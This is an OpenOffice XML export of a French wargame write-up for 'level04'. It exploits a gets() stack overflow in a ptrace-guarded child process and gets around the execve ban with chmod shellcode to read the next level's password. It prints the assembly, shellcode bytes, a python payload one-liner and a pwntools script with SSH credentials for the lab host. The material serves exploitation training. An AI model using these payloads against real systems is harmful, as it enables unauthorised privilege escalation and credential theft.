      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T16">&gt; If child process attempted to </text:span><text:span text:style-name="T17">execve()</text:span><text:span text:style-name="T16">, display message and kill child process.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">REMARQUE : Lorsque </text:span><text:span text:style-name="T17">execve</text:span><text:span text:style-name="T16"> est appelé dans le child process, la fonction </text:span><text:span text:style-name="T17">wait </text:span><text:span text:style-name="T16">ne bloque plus le processus parent et permet au </text:span><text:span text:style-name="T17">ptrace </text:span><text:span text:style-name="T16">d'examiner le contenu de </text:span><text:span text:style-name="T17">eax</text:span><text:span text:style-name="T16">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">Bref, on </text:span><text:span text:style-name="T17">ne peut pas faire exécuter du execve </text:span><text:span text:style-name="T16">au child process dans le cadre d'un buffer overflow ou d'une exécution de shellcode. Si c'est le cas, le processus parent va directement </text:span><text:span text:style-name="T17">kill </text:span><text:span text:style-name="T16">le processus enfant.</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">Au niveau de l'exploitation maintenant, on a remarqué qu'il existe un buffer overflow dans le processus enfant (</text:span><text:span text:style-name="T17">gets</text:span><text:span text:style-name="T16"> dans un buffer statique de taille fixe). La stack est exécutable. Le plan est donc très simple.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">&gt; Overwrite return adress in child process.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">&gt; Redirect execution flow to </text:span><text:span text:style-name="T17">jmp esp </text:span><text:span text:style-name="T16">gadget.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">&gt; Execute our shellcode following the bytes overwritting the return address in buffer.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">On calcule l'offset auquel on contrôle la </text:span><text:span text:style-name="T17">return address <text:tab/>--&gt;<text:tab/></text:span><text:span text:style-name="T16">156.</text:span></text:p>
      <text:p text:style-name="P1">On récupère l'adresse d'un gadget <text:span text:style-name="T3">jmp esp</text:span><text:span text:style-name="T14"><text:tab/><text:tab/><text:tab/>--&gt;<text:tab/>0xf7e2ea55</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">On a tout ce qu'il faut pour faire exécuter du shellcode au processus enfant. Essayons d'abord, juste pour tester, de lui faire exécuter un shellcode </text:span><text:span text:style-name="T3">execve("/bin//sh")</text:span><text:span text:style-name="T14">, ce qui devrait donc directement échouer :</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T14"># --&gt; execve("/bin//sh")</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T6">shellcode</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T13">'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T13">''</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">+=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T13">'A'</text:span> <text:span text:style-name="T6">*</text:span> <text:span text:style-name="T12">156</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">+=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T13">'\x55\xea\xe2\xf7'</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">+=</text:span> <text:span text:style-name="T6">shellcode</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T6">file</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T21">open</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T13">"payload"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T13">"wb"</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P15">file.write(payload)</text:p>
      <text:p text:style-name="P10">file.close()</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">On transfert le fichier </text:span><text:span text:style-name="T3">payload </text:span><text:span text:style-name="T14">sur la machine cible, et on essaie d'exécuter le programme avec le payload. Comme prévu, le processus enfant est tué directement et un message "no exec() for you" est affiché :</text:span></text:p>
      <text:p text:style-name="P1"><draw:frame draw:style-name="fr1" draw:name="images1" text:anchor-type="paragraph" svg:x="-0.021cm" svg:y="0.249cm" svg:width="9.738cm" svg:height="1.984cm" draw:z-index="0"><draw:image xlink:href="Pictures/200000070000260A000007C1C144EE8B.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">Mais en réalité, si </text:span><text:span text:style-name="T3">execve </text:span><text:span text:style-name="T14">est proscrit, on peut toujours exécuter du shellcode pour effectuer d'autres actions que pour ouvrir une shell. De plus, puisque la vulnérabilité vient d'un </text:span><text:span text:style-name="T3">gets</text:span><text:span text:style-name="T14">, on a </text:span><text:span text:style-name="T3">pas à se soucier des \x00 (NULL BYTES)</text:span><text:span text:style-name="T14">, gets ne s'arrête pas aux NULL BYTES. On est donc très libre finalement dans le shellcode qu'on souhaite faire exécuter au système.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T14">On a pas mal d'options ici (appeler </text:span><text:span text:style-name="T3">fopen </text:span><text:span text:style-name="T14">puis </text:span><text:span text:style-name="T3">fread </text:span><text:span text:style-name="T14">et </text:span><text:span text:style-name="T3">write </text:span><text:span text:style-name="T14">pour leak le fichier </text:span><text:span text:style-name="T3">.pass</text:span><text:span text:style-name="T14">), mais on choisit une solution relativement simple, qui est de faire appel au </text:span><text:span text:style-name="T3">syscall chmod</text:span><text:span text:style-name="T14">. Le numéro du syscall est 15, et il nous permet de modifier les permissions sur les dossiers et les fichiers.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">En effet, on sait que les permissions dans les dossiers </text:span><text:span text:style-name="T3">home </text:span><text:span text:style-name="T14">des utilisateurs sont les suivantes :</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><draw:frame draw:style-name="fr1" draw:name="images2" text:anchor-type="paragraph" svg:x="0.071cm" svg:y="0cm" svg:width="15.639cm" svg:height="6.352cm" draw:z-index="1"><draw:image xlink:href="Pictures/2000000700003D16000018CFFF7CBF9B.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T14"> </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">Le fichier </text:span><text:span text:style-name="T3">.pass </text:span><text:span text:style-name="T14">est lisible par tout le monde ; cependant, seul </text:span><text:span text:style-name="T3">level04 </text:span><text:span text:style-name="T14">a les droits de lecture sur le dossier qui contient ce fichier. Or, </text:span><text:span text:style-name="T3">un fichier contenu dans un dossier sur lequel nous n'avons pas les droits ne peut être lu </text:span><text:span text:style-name="T14">(même si les permissions du fichier laisseraient penser qu'on pourrait y accéder).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">Tout ce qu'il nous reste à faire ici est donc de </text:span><text:span text:style-name="T3">chmod 777 /home/users/level05 </text:span><text:span text:style-name="T14">afin de le rendre accessible en lecture pour tous, ce qui nous permettra de lire le fichier </text:span><text:span text:style-name="T3">.pass</text:span><text:span text:style-name="T14">. On écrit cela en assembleur, </text:span><text:span text:style-name="T3">32bits</text:span><text:span text:style-name="T14"> :</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T6">bits</text:span> <text:span text:style-name="T12">32</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T6">global</text:span> <text:span text:style-name="T6">main</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T6">section</text:span> <text:span text:style-name="T6">.text</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T6">;chmod</text:span> <text:span text:style-name="T12">777</text:span> <text:span text:style-name="T6">/home/users</text:span><text:span text:style-name="T22">//level05</text:span><text:span text:style-name="T9"> <text:s text:c="3"/></text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T6"><text:tab/>main:</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">xor</text:span> <text:span text:style-name="T6">eax,eax</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">push</text:span> <text:span text:style-name="T6">eax<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T23">; '\0'</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">push</text:span> <text:span text:style-name="T12">0x35306c65<text:tab/><text:tab/></text:span><text:span text:style-name="T23">; el05</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">push</text:span> <text:span text:style-name="T12">0x76656c2f<text:tab/><text:tab/></text:span><text:span text:style-name="T23">; /lev <text:s/>--&gt; ON STACK : /home/users</text:span><text:span text:style-name="T25">//level05</text:span><text:span text:style-name="T24"> + '\0'</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">push</text:span> <text:span text:style-name="T12">0x2f737265<text:tab/><text:tab/></text:span><text:span text:style-name="T23">; ers/</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">push</text:span> <text:span text:style-name="T12">0x73752f65<text:tab/><text:tab/></text:span><text:span text:style-name="T23">; e/us</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">push</text:span> <text:span text:style-name="T12">0x6d6f682f<text:tab/><text:tab/></text:span><text:span text:style-name="T23">; /hom</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">mov</text:span> <text:span text:style-name="T6">ebx,esp</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">xor</text:span> <text:span text:style-name="T6">ecx,ecx<text:tab/><text:tab/></text:span><text:span text:style-name="T23">; ecx --&gt; 0x00000000</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">mov</text:span> <text:span text:style-name="T6">cx,</text:span><text:span text:style-name="T12">0x1ff<text:tab/><text:tab/></text:span><text:span text:style-name="T23">; ecx --&gt; 0x000001ff --&gt; 0777o</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">mov</text:span> <text:span text:style-name="T6">al,</text:span><text:span text:style-name="T12">15</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T12">0x80<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T23">; chmod</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">xor</text:span> <text:span text:style-name="T6">eax,eax</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">inc</text:span> <text:span text:style-name="T6">eax</text:span></text:p>
      <text:p text:style-name="P11"><text:s text:c="8"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T12">0x80<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T23">; exit</text:span></text:p>
      <text:p text:style-name="P1">Plusieurs remarques :</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>&gt; On a essayé de produire un code <text:span text:style-name="T3">sans NULL BYTE </text:span><text:span text:style-name="T14">(même si ceux-ci seraient passés ici) pour s'entraîner.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">&gt; C'est d'ailleurs pour cela qu'on trouve </text:span><text:span text:style-name="T3">plusieurs slash </text:span><text:span text:style-name="T14">dans le filepath dont on a besoin comme string. En effet, il faut que le string ait pour longueur </text:span><text:span text:style-name="T3">un multiple de 4 </text:span><text:span text:style-name="T14">afin que les nombres hexadécimaux qui les représentent soient entièrement remplis et ne laissent pas d'espace pour des \x00. Et on peut ajouter un nombre arbitraire de '</text:span><text:span text:style-name="T20">/</text:span><text:span text:style-name="T14">' dans le filepath, cela sera ignoré par l'OS.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">&gt; Pour éviter les NULL BYTES toujours, on </text:span><text:span text:style-name="T3">xor eax,eax</text:span><text:span text:style-name="T14"> au lieu de mov eax,0x0 par exemple afin de placer un NULL BYTE sur la pile.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">&gt; Après avoir empilé </text:span><text:span text:style-name="T3">eax </text:span><text:span text:style-name="T14">qui nous servira de </text:span><text:span text:style-name="T3">null byte</text:span><text:span text:style-name="T14">, on empile notre string sur la pile sous la forme de nombres hexadécimaux, 4 caractères par 4 caractères.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">&gt; Afin de placer 777 en octal dans </text:span><text:span text:style-name="T3">ecx</text:span><text:span text:style-name="T14">, on doit y placer 0x1ff en hexa. Si on tente simplement de mov ecx, 0x1ff, des </text:span><text:span text:style-name="T3">null bytes </text:span><text:span text:style-name="T14">seront rajoutés dans les instructions. On </text:span><text:span text:style-name="T3">xor </text:span><text:span text:style-name="T14">donc ecx pour le placer à 0, puis on ajouter 0x1ff dans </text:span><text:span text:style-name="T3">cx</text:span><text:span text:style-name="T14">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">&gt; On appelle </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T14"> avec le syscall </text:span><text:span text:style-name="T3">15</text:span><text:span text:style-name="T14">, ce qui déclenche notre </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T14">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">&gt; On </text:span><text:span text:style-name="T3">exit</text:span><text:span text:style-name="T14">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">Tout ça devrait faire l'affaire et produire un shellcode exécutant <text:s/></text:span><text:span text:style-name="T3">chmod 777 /home/users/level05 </text:span><text:span text:style-name="T14">sans NULL BYTE.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">On le compile (toujours en 32 bits!) (</text:span><text:a xlink:type="simple" xlink:href="https://stackoverflow.com/questions/13178501/compiling-32-bit-assembler-on-64-bit-ubuntu" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T14">https://stackoverflow.com/questions/13178501/compiling-32-bit-assembler-on-64-bit-ubuntu</text:span></text:a><text:span text:style-name="T14"> ) :</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T14">nasm -f elf32 chmod_dir.asm -o chmod_dir.o &amp;&amp; gcc -m32 chmod_dir.o -o chmod_dir</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">On peut ensuite tout à fait créer un dossier en local /home/users/level05 et exécuter le binaire pour vérifier qu'il fait bien son travail. Quoi qu'il en soit, on sait maintenant que tout compile et que le comportement du programme est le comportement attendu. On transforme maintenant nos instructions assembleur en </text:span><text:span text:style-name="T3">shellcode</text:span><text:span text:style-name="T14">. Je l'ai fait en ligne avec :</text:span></text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="https://defuse.ca/online-x86-assembler.htm" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T14">https://defuse.ca/online-x86-assembler.htm</text:span></text:a><text:span text:style-name="T14"> </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">On copie les instructions assembleur x86 et ils nous sortent les </text:span><text:span text:style-name="T3">opcodes</text:span><text:span text:style-name="T14">. On peut ensuite d'ailleurs les tester dans un petit wrapper C en suivant le modèle de cette question stackoverflow :</text:span></text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="https://stackoverflow.com/questions/57821963/how-can-i-reprogram-my-shellcode-snippet-to-avoid-null-bytes" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T14">https://stackoverflow.com/questions/57821963/how-can-i-reprogram-my-shellcode-snippet-to-avoid-null-bytes</text:span></text:a><text:span text:style-name="T14"> </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">Quoi qu'il en soit, on crée notre fichier payload de manière très similaire au précédent qui tentait d'exécuter </text:span><text:span text:style-name="T3">execve</text:span><text:span text:style-name="T14"> :</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T14"># --&gt; chmod 777 /home/users//level05</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T6">shellcode</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T13">'\x31\xC0\x50\x68\x65\x6C\x30\x35\x68\x2F\x6C\x65\x76\x68\x65\x72\x73\x2F\x68\x65\x2F\x75\x73\x68\x2F\x68\x6F\x6D\x89\xE3\x31\xC9\x66\xB9\xFF\x01\xB0\x0F\xCD\x80\x31\xC0\x40\xCD\x80'</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T13">''</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">+=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T13">'A'</text:span> <text:span text:style-name="T6">*</text:span> <text:span text:style-name="T12">156</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">+=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T13">'\x55\xea\xe2\xf7'</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">+=</text:span> <text:span text:style-name="T6">shellcode</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T6">file</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T21">open</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T13">"payload"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T13">"wb"</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P15"><text:soft-page-break/>file.write(payload)</text:p>
      <text:p text:style-name="P10">file.close()</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">On transfert, on exécute, et on voit que notre shellcode exécutant </text:span><text:span text:style-name="T3">chmod </text:span><text:span text:style-name="T14">a bien été exécuté :</text:span></text:p>
      <text:p text:style-name="P1"><draw:frame draw:style-name="fr1" draw:name="images3" text:anchor-type="paragraph" svg:x="-0.009cm" svg:y="0.169cm" svg:width="15.533cm" svg:height="8.731cm" draw:z-index="2"><draw:image xlink:href="Pictures/2000000700003CAC0000221CB477A2D2.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">On peut désormais tranquillement lire le fichier </text:span><text:span text:style-name="T3">.pass</text:span><text:span text:style-name="T14">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">REMARQUE : si le fichier </text:span><text:span text:style-name="T3">.pass </text:span><text:span text:style-name="T14">n'était pas readable par tout le monde, on aurait pu simplement appliquer la même technique suite au chmod du dossier pour le fichier. C'est d'ailleurs ce que j'ai fait au départ avant de me rendre compte qu'on avait déjà les permissions en lecture pour le fichier, et que c'était les permissions du dossier qui bloquaient.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">&gt;&gt; </text:span><text:span text:style-name="T15">Exploitation manuelle</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T16">$ python -c </text:span><text:span text:style-name="T26">"print('A' * 156 + '\x55\xea\xe2\xf7' + '\x31\xC0\x50\x68\x65\x6C\x30\x35\x68\x2F\x6C\x65\x76\x68\x65\x72\x73\x2F\x68\x65\x2F\x75\x73\x68\x2F\x68\x6F\x6D\x89\xE3\x31\xC9\x66\xB9\xFF\x01\xB0\x0F\xCD\x80\x31\xC0\x40\xCD\x80')"</text:span><text:span text:style-name="T16"> &gt; /tmp/payload</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">$ ./level04 &lt; /tmp/payload</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P9">$ cat /home/users/level05/.pass</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">&gt;&gt; </text:span><text:span text:style-name="T15">Exploit automatique</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T2">from</text:span><text:span text:style-name="T14"> </text:span><text:span text:style-name="T5">pwn</text:span><text:span text:style-name="T14"> </text:span><text:span text:style-name="T2">import</text:span><text:span text:style-name="T14"> </text:span><text:span text:style-name="T7">*</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P17">### Some information ###</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P17"># libc <text:s text:c="5"/>@ 0xf7e2c000</text:p>
      <text:p text:style-name="P17"># jmp esp <text:s text:c="2"/>@ 0xf7e2ea55</text:p>
      <text:p text:style-name="P17"># offset <text:s text:c="3"/>@ 156</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:soft-page-break/><text:span text:style-name="T6">s</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">ssh(host=</text:span><text:span text:style-name="T13">"192.168.1.3"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">port=</text:span><text:span text:style-name="T12">4242</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">user=</text:span><text:span text:style-name="T13">"level04"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">password=</text:span><text:span text:style-name="T13">"kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf"</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T6">p</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">s.process(</text:span><text:span text:style-name="T13">"/home/users/level04/./level04"</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P17"># --&gt; chmod 777 /home/users//level05</text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T6">shellcode</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T13">'\x31\xC0\x50\x68\x65\x6C\x30\x35\x68\x2F\x6C\x65\x76\x68\x65\x72\x73\x2F\x68\x65\x2F\x75\x73\x68\x2F\x68\x6F\x6D\x89\xE3\x31\xC9\x66\xB9\xFF\x01\xB0\x0F\xCD\x80\x31\xC0\x40\xCD\x80'</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T13">''</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">+=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T13">'A'</text:span> <text:span text:style-name="T6">*</text:span> <text:span text:style-name="T12">156</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">+=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T13">'\x55\xea\xe2\xf7'</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">+=</text:span> <text:span text:style-name="T6">shellcode</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P15">p.sendline(payload)</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T6">p2</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">s.process([</text:span><text:span text:style-name="T13">"/bin/cat"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T13">"/home/users/level05/.pass"</text:span><text:span text:style-name="T6">])</text:span></text:p>
      <text:p text:style-name="P10">p2.interactive()</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Got flag</text:span><text:span text:style-name="T1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7M3S</meta:editing-duration>
    <meta:editing-cycles>5</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.5$Win32 OpenOffice.org_project/415m1$Build-9789</meta:generator>
    <dc:date>2021-12-06T16:22:41.29</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="3" meta:object-count="0" meta:page-count="8" meta:paragraph-count="188" meta:word-count="2075" meta:character-count="14006"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>